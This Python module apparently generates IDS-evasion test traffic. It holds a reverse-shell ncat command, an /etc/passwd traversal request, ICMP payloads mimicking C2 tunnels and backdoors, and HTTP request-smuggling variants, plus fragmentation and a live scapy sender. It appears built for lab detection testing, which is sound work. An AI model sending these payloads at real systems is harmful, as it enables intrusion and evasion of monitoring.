import random
import time
from .mutator import encode_layers, fragment_payload

ICMP_PAYLOAD = "ncat -e /bin/sh 10.0.0.5 4444"
HTTP_PAYLOAD = "GET /../../../etc/passwd HTTP/1.1\r\nHost: lab\r\n\r\n"

ICMP_TUNNEL_PAYLOADS = {
    "echo_loki": (8, 0, "LOKI2 session=42 seq=1 chunk=1|ncat -e /bin/sh"),
    "echo_ptunnel": (8, 0, "PTUNNEL session=42 seq=1 len=24|TCP-DATA"),
    "echo_icmpsh": (8, 0, "ICMPSH session=42 seq=1|whoami"),
    "echo_pingrat": (8, 0, "PINGRAT session=42 seq=1|C2-DATA"),
    "timestamp": (13, 0, "LOKI timestamp session=42 seq=1|C2-DATA"),
    "destination_unreachable": (3, 3, "ICMP_GOSH session=42 seq=1|C2-DATA"),
    "redirect": (5, 1, "BPFDoor magic=BPFD session=42|C2-DATA"),
    "time_exceeded": (11, 0, "GOST magic=GOST len=24 session=42|QUIC-DATA"),
    "traceroute": (30, 0, "ICMP_GOSH session=42 seq=1|C2-DATA"),
    "large_payload": (8, 0, "AEMF-LAB " + ("A" * 220)),
}

HTTP_DESYNC_PAYLOADS = {
    "cl_te": (
        "POST /aemf-test HTTP/1.1\r\nHost: lab\r\n"
        "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"
    ),
    "te_cl": (
        "POST /aemf-test HTTP/1.1\r\nHost: lab\r\n"
        "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n"
        "GET /aemf-test HTTP/1.1\r\nHost: lab\r\n\r\n"
    ),
    "te_te": (
        "POST /aemf-test HTTP/1.1\r\nHost: lab\r\n"
        "Transfer-Encoding: chunked, identity\r\nTransfer-Encoding: xchunked\r\n\r\n"
        "0\r\n\r\n"
    ),
    "cl_0": (
        "POST /aemf-test HTTP/1.1\r\nHost: lab\r\nContent-Length: 0\r\n\r\n"
        "GET /aemf-test HTTP/1.1\r\nHost: lab\r\n\r\n"
    ),
    "te_0": (
        "POST /aemf-test HTTP/1.1\r\nHost: lab\r\n"
        "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
        "GET /aemf-test HTTP/1.1\r\nHost: lab\r\n\r\n"
    ),
    "0_cl": (
        "POST /aemf-test HTTP/1.1\r\nHost: lab\r\nContent-Length: 0\r\n\r\n"
        "GET /aemf-test HTTP/1.1\r\nHost: lab\r\n\r\n"
    ),
    "h2_cl": (
        ":method: POST\r\n:path: /aemf-test\r\n"
        "content-length: 4\r\n\r\nTEST"
    ),
    "h2_te": (
        ":method: POST\r\n:path: /aemf-test\r\n"
        "transfer-encoding: chunked\r\n\r\n0\r\n\r\n"
    ),
    "crlf_injection": (
        "GET /aemf-test?next=%0d%0aX-AEMF-Injected:%20yes HTTP/1.1\r\n"
        "Host: lab\r\n\r\n"
    ),
    "dual_content_length": (
        "POST /aemf-test HTTP/1.1\r\nHost: lab\r\n"
        "Content-Length: 4\r\nContent-Length: 11\r\n\r\nTEST"
    ),
    "expect_continue": (
        "POST /aemf-test HTTP/1.1\r\nHost: lab\r\n"
        "Expect: 100-continue\r\nContent-Length: 4\r\n\r\nTEST"
    ),
    "pause": (
        "POST /aemf-test HTTP/1.1\r\nHost: lab\r\n"
        "Content-Length: 4\r\n\r\nTEST"
    ),
}

class Shadow:
    def __init__(self, rng=None):
        self.rng = rng or random.Random(7)

    def build(self, attack, layers=None, fragment_size=4, out_of_order=False, overlap=False, delay=0.0):
        if attack == "icmp":
            raw = ICMP_PAYLOAD
            protocol = "ICMP"
            icmp_type, icmp_code = 8, 0
        elif attack in ICMP_TUNNEL_PAYLOADS:
            icmp_type, icmp_code, raw = ICMP_TUNNEL_PAYLOADS[attack]
            protocol = "ICMP"
        elif attack == "http":
            raw = HTTP_PAYLOAD
            protocol = "HTTP"
        elif attack in HTTP_DESYNC_PAYLOADS:
            raw = HTTP_DESYNC_PAYLOADS[attack]
            protocol = "HTTP"
        else:
            raise ValueError("unsupported attack type")
        if layers is None:
            layers = [] if protocol == "HTTP" else ["base64"]
        if attack == "pause" and delay == 0.0:
            delay = 0.5
        encoded = encode_layers(raw, layers)
        fragments = fragment_payload(encoded, fragment_size, out_of_order, overlap)
        return {
            "attack": attack,
            "protocol": protocol,
            "original": raw,
            "encoded": encoded,
            "fragments": fragments,
            "delay": delay,
            "icmp_type": icmp_type if protocol == "ICMP" else None,
            "icmp_code": icmp_code if protocol == "ICMP" else None,
        }

    def send_live(self, plan, dst_ip, iface=None, src_ip=None):
        from scapy.all import IP, ICMP, TCP, Raw, send
        if not dst_ip:
            raise ValueError("dst_ip is required for live mode")
        ident = self.rng.randint(1, 65535)
        if plan["protocol"] == "ICMP":
            for seq, payload in plan["fragments"]:
                icmp = ICMP(type=plan.get("icmp_type", 8), code=plan.get("icmp_code", 0))
                if plan.get("icmp_type", 8) in (0, 8):
                    icmp.id = ident
                    icmp.seq = seq
                pkt = IP(dst=dst_ip, src=src_ip, id=seq & 0xffff)/icmp/Raw(payload)
                send(pkt, iface=iface, verbose=False)
                if plan["delay"]:
                    time.sleep(plan["delay"])
            final_seq = max((seq + len(payload) for seq, payload in plan["fragments"]), default=0)
            final_icmp = ICMP(type=plan.get("icmp_type", 8), code=plan.get("icmp_code", 0))
            if plan.get("icmp_type", 8) in (0, 8):
                final_icmp.id = ident
                final_icmp.seq = final_seq
            send(
                IP(dst=dst_ip, src=src_ip, id=final_seq & 0xffff)
                / final_icmp
                / Raw(b"\n"),
                iface=iface,
                verbose=False,
            )
        else:
            sport = self.rng.randint(20000, 50000)
            base_seq = self.rng.randint(100000, 500000)
            for seq, payload in plan["fragments"]:
                pkt = IP(dst=dst_ip, src=src_ip)/TCP(sport=sport, dport=80, flags="PA", seq=base_seq+seq)/Raw(payload)
                send(pkt, iface=iface, verbose=False)
                if plan["delay"]:
                    time.sleep(plan["delay"])
